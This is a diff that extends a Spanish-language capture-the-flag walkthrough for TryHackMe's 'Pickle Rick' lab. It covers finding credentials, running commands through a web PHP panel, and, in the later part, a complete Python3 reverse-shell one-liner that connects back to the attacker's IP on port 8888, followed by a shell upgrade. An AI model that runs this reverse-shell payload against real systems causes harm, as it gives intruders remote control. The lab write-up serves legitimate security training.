@@ -1,4 +1,4 @@
-# Guia_Pickle_Rick
+![image](https://github.com/user-attachments/assets/7d17c77b-532d-4103-9629-256c265b32a0)# Guia_Pickle_Rick
 Maquina para principiantes de TryHackMe, pensada para usar herramientas y técnicas básicas
 
 # Recursos requeridos en el procedimiento:
@@ -98,19 +98,75 @@ Pero mas importante vemos un directorio `/login.php`.
 
 Puedes revisar cual gustes aqui solo pondres los que son importantes.
 
+### Revisando el `/robots.txt`
 
+![image](https://github.com/user-attachments/assets/0a78485b-7fa2-452f-a394-a2fc2473cdc0)
 
+- Vemos un texto, lo guadaremos en caso de que se nos pida alguna contraseña. 
 
+### Revisando `/login.php`
 
+![image](https://github.com/user-attachments/assets/0dcfa508-a00b-413e-8d2e-18dc989c1d9b)
 
+Podemos ver que es una pagina de login 
 
+anterior mente encontramos un usuario en un comentario del code: R1ckRul3s
+y tambien encontramos una palabra en `/robots.txt`.
 
+![image](https://github.com/user-attachments/assets/9e777166-868d-4b1c-8d2c-5a246b95a155)
 
+Como podemo ser es una terminal de php por lo que podemos ejecutar comando en el equipo. 
+pero para estar seguros ejecutamos un comando `whoami` para ver quien somos, en este caso somos `www-data` 
 
+ahora averiguaremos que archivos puedo ver con `ls`.
 
+![image](https://github.com/user-attachments/assets/9eaebf1a-8277-4626-8afe-a0f197a656d4)
 
+Vemos varios textos por lo que usaremos `nl` para sobreleer la informacion del texto.
 
+![image](https://github.com/user-attachments/assets/29089b17-e650-4716-804d-dac6c27e09a6)
 
+### Primera flag: mr. meeseek hair
+
+entreo los directorios no se ve nada interesante por lo que nos interesaria intentar hacer una [reverse shell](https://www.swhosting.com/es/blog/uso-del-comando-grep-en-sistemas-linux-unix) pero usando python3.
+
+pero no sabemos si ese sistema tiene python instalado por lo que lo verificaremos.
+
+![image](https://github.com/user-attachments/assets/eb05ef62-0b1b-4170-a91e-2e29955b0251)
+
+Podemos ver que efectivamente responde por lo que ejecutaremos script de python para hacer reverse shell.
+
+![image](https://github.com/user-attachments/assets/6345f700-db07-457c-8cbd-0fc076df5119)
+
+Sabemos que el sistema usae python3 por lo que tenemos que especificar.
+
+y ademas necesitaremos modificar el script para que nos funcione y ademas necesitamos poner un puerto a escuchar para resivir la reverse shell. 
+
+para esto necesitamos saber cual es nuestra IP en mi casa:
+
+![image](https://github.com/user-attachments/assets/ab5cc452-d7f8-4127-97a9-dafcba7f04b7)
+
+tenemos tambien que acitvar un puerto en nuestro equipo para recibir, yo escogi el puerto 8888.
+
+![image](https://github.com/user-attachments/assets/62adebd4-dc76-4a71-af67-9a0fbb1b582e)
+
+y con eso queda pendiente a la reverse shell.
+
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.35.128",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+IP: 10.21.35.128 - Puerto: 8888 
+
+![image](https://github.com/user-attachments/assets/18a29b99-c10c-42b0-8048-75314c2979a2)
+
+Una ves ejecutado podemos ver que el puerto ha recibido la reverse shell.
+
+![image](https://github.com/user-attachments/assets/06d3e158-6ed9-4abc-b53d-3ca24a899813)
+
+ahora para tener una mejor interfaz ejecutamos el siguiente escript `script /dev/null -c bash`.
+
+![image](https://github.com/user-attachments/assets/c0c71bc3-228c-4c10-a68b-c70dd9eb7577)
+
+lo que nos da una interfaz que nos muesta quienes somo y donde estamos. 
 
 
 
